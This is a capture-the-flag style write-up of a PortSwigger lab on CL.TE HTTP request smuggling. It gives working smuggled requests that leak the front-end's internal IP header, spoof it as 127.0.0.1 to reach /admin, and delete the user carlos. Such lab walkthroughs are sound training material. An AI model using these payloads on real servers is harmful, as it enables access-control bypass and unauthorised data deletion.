# [Exploiting HTTP request smuggling to reveal front-end request rewriting](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)

> delete the **carlos** user

- open the lab in burp browser
- try the `/admin` page
- it will give back a message:

```
Admin interface only available if logged in as an administrator, or if requested from 127.0.0.1
```

- lets try it with `X-Forwarded-For: 127.0.0.1`

```
GET /admin HTTP/2
Host: xxx.web-security-academy.net
X-Forwarded-For: 127.0.0.1
...
```

- same message
- lets try to get the vulnerability

## CL.TE

- check what type of vulnerability is there

```
POST / HTTP/1.1
Host: xxx.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 6

3
asd
X
```

- this will time out so it is `CL.TE`
- lets confirm it

> first request:

```
POST / HTTP/1.1
Host: 0aec002c04c107f4808499f4004800e4.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 49

0

GET /quack HTTP/1.1
Content-Length: 3

x=
```

> second request:

```
POST / HTTP/1.1
Host: 0aec002c04c107f4808499f4004800e4.web-security-academy.net
Content-Length: 10

duck=quack
```

- this will return a `404` what confirms that it is a `CL.TE`

## admin request smuggling

- lets try for `/admin` with `X-Forwarded-For: 127.0.0.1`

> first request:

```
POST / HTTP/1.1
Host: 0aec002c04c107f4808499f4004800e4.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 49

0

GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1
Content-Length: 3

x=
```

> second request:

```
POST / HTTP/1.1
Host: 0aec002c04c107f4808499f4004800e4.web-security-academy.net
Content-Length: 10

duck=quack
```

- gonna get a `HTTP/1.1 401 Unauthorized` response

## lets find the header for the admin

- in the `/` page the search represented int he response, it might be a good smuggling point

```
POST / HTTP/2
...
search=duck
```

> first request:

```
POST / HTTP/1.1
Host: 0aec002c04c107f4808499f4004800e4.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 57

0

POST / HTTP/1.1
Content-Length: 150

search=quack
```

- the second `Content-Length` should be at least as long as the second request itself
- might get a timeout if it is too high

> second request:

```
POST / HTTP/1.1
Host: 0aec002c04c107f4808499f4004800e4.web-security-academy.net
Content-Length: 10

duck=not
```

- the second response will give back the search keyword + the appended `POST` what was sent to the backend

```
<h1>
    0 search results for 'qwePOST / HTTP/1.1
    X-vTgcSD-Ip: 89.27.105.113
    Host: 0aec002c04c107f4808499f4004800e4.web-security-academy'
</h1>
```

- the admin access is trough the `X-vTgcSD-Ip: 89.27.105.113`

# admin hijack

lets use the `X-vTgcSD-Ip`

> first request:

```
POST / HTTP/1.1
Host: 0aec002c04c107f4808499f4004800e4.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 73

0

GET /admin HTTP/1.1
X-vTgcSD-Ip: 127.0.0.1
Content-Length: 3

x=
```

> second request:

```
POST / HTTP/1.1
Host: 0aec002c04c107f4808499f4004800e4.web-security-academy.net
Content-Length: 10

duck=not
```

- this will give back the **carlos** delete link

## delete carlos

> first request:

```
POST / HTTP/1.1
Host: 0aec002c04c107f4808499f4004800e4.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 96

0

GET /admin/delete?username=carlos HTTP/1.1
X-vTgcSD-Ip: 127.0.0.1
Content-Length: 3

x=
```

> second request:

```
POST / HTTP/1.1
Host: 0aec002c04c107f4808499f4004800e4.web-security-academy.net
Content-Length: 10

duck=not
```
